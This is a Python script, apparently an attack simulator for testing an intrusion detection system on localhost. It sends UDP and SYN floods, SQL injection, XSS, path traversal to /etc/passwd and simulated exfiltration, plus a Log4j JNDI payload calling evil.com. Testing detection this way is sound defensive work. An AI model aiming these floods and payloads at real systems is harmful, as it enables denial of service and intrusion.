import time
import sys
import random
from scapy.all import send, IP, TCP, UDP, Raw, RandShort

TARGET_IP = "127.0.0.1"
TARGET_PORT = 80

def print_menu():
    print("\n=== AURA Advanced Attack Simulator ===")
    print("1. DDoS Attack (UDP Flood) -> [Test ML Detection]")
    print("2. SQL Injection Attack    -> [Test OSINT Rule]")
    print("3. XSS Attack              -> [Test OSINT Rule]")
    print("4. Log4j Exploit (RCE)     -> [Test OSINT Rule]")
    print("5. Path Traversal Attack   -> [Test OSINT Rule]")
    print("6. SYN Flood (DoS)         -> [Test ML Detection]")
    print("7. Zero Day Data Exfil     -> [Test ML Generalization]")
    print("8. HTTPS Bot Attack        -> [Test JA3 Fingerprinting]")
    print("0. Exit")
    print("======================================")

def ddos_flood():
    print(f"\n[*] Starting UDP Flood on {TARGET_IP}...")
    print("[*] Sending 1000 packets. Press Ctrl+C to stop early.")
    try:
        for i in range(1000):
            pkt = IP(dst=TARGET_IP)/UDP(dport=8080, sport=RandShort())/Raw(load="X"*50)
            send(pkt, verbose=False)
            if i % 50 == 0:
                sys.stdout.write(".")
                sys.stdout.flush()
        print("\n[+] UDP Flood Complete.")
    except KeyboardInterrupt:
        print("\n[!] Attack Stopped.")

def syn_flood():
    print(f"\n[*] Starting SYN Flood on {TARGET_IP}...")
    print("[*] Sending 1000 SYN packets...")
    try:
        for i in range(1000):
            pkt = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT, sport=RandShort(), flags="S")
            send(pkt, verbose=False)
            if i % 50 == 0:
                sys.stdout.write(".")
                sys.stdout.flush()
        print("\n[+] SYN Flood Complete.")
    except KeyboardInterrupt:
        print("\n[!] Attack Stopped.")

def send_payload(name, payload):
    print(f"\n[*] Simulating {name}...")
    print(f"[*] Payload: {payload}")
    
    # Construct HTTP-like packet
    http_req = f"GET /search?q={payload} HTTP/1.1\r\nHost: target\r\n\r\n"
    pkt = IP(dst=TARGET_IP)/TCP(dport=TARGET_PORT, sport=RandShort(), flags="PA")/Raw(load=http_req)
    
    send(pkt, verbose=False)
    print(f"[+] Packet Sent. Check IDS for Block.")

def sql_injection():
    payload = "admin' UNION SELECT 1, user(), 3 --"
    send_payload("SQL Injection", payload)

def xss_attack():
    payload = "<script>alert('pwned')</script>"
    send_payload("XSS Attack", payload)

def log4j_exploit():
    payload = "${jndi:ldap://evil.com/exploit}"
    send_payload("Log4j Exploit", payload)

def path_traversal():
    payload = "../../../../../etc/passwd"
    send_payload("Path Traversal", payload)

def zero_day_exfiltration():
    print(f"\n[*] Simulating Zero Day Data Exfiltration...")
    print("[*] Behavior: Large packets, irregular timing, unusual flags (PSH+URG).")
    print("[*] Sending 20 chunks of 'stolen data'...")
    
    try:
        for i in range(20):
            # Random large payload size (simulating file chunks)
            size = random.randint(800, 1400)
            data = "SECRET_DATA_" + "A" * size
            
            # Unusual TCP Flags: PSH + URG (0x28) often used to bypass filters
            pkt = IP(dst=TARGET_IP)/TCP(dport=443, sport=RandShort(), flags="PU")/Raw(load=data)
            send(pkt, verbose=False)
            
            # Irregular timing (Low and Slow)
            sleep_time = random.uniform(0.1, 0.5)
            time.sleep(sleep_time)
            
            sys.stdout.write(".")
            sys.stdout.flush()
            
        print("\n[+] Exfiltration Complete. Check IDS for 'ML_ANOMALY'.")
    except KeyboardInterrupt:
        print("\n[!] Attack Stopped.")

def https_bot_attack():
    print(f"\n[*] Simulating HTTPS Bot Attack (Python Requests)...")
    print("[*] This will generate a standard Python JA3 fingerprint.")
    
    # We need a listening port 443 on localhost for this to work.
    # Since we don't have a real web server, we'll just send the Client Hello
    # using scapy's TLS layer directly to ensure we control the fingerprint 
    # OR just try to connect and fail, but the Client Hello is sent first.
    
    import socket
    import ssl
    
    try:
        # Create a raw socket to send a Client Hello? 
        # Easier: Just use python's ssl module to try to connect.
        # The IDS sniffer will see the Client Hello before the connection fails.
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((TARGET_IP, 443), timeout=2) as sock:
            with context.wrap_socket(sock, server_hostname=TARGET_IP) as ssock:
                ssock.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                
    except Exception as e:
        # Expected to fail if no server is listening, but packet is sent
        print(f"[+] Client Hello Sent. (Connection failed as expected: {e})")
        print("[+] Check IDS for 'JA3_BLOCK'.")

if __name__ == "__main__":
    while True:
        print_menu()
        choice = input("Select Attack (0-6): ")
        
        if choice == '1':
            ddos_flood()
        elif choice == '2':
            sql_injection()
        elif choice == '3':
            xss_attack()
        elif choice == '4':
            log4j_exploit()
        elif choice == '5':
            path_traversal()
        elif choice == '6':
            syn_flood()
        elif choice == '7':
            zero_day_exfiltration()
        elif choice == '8':
            https_bot_attack()
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid choice!")
        
        time.sleep(1)
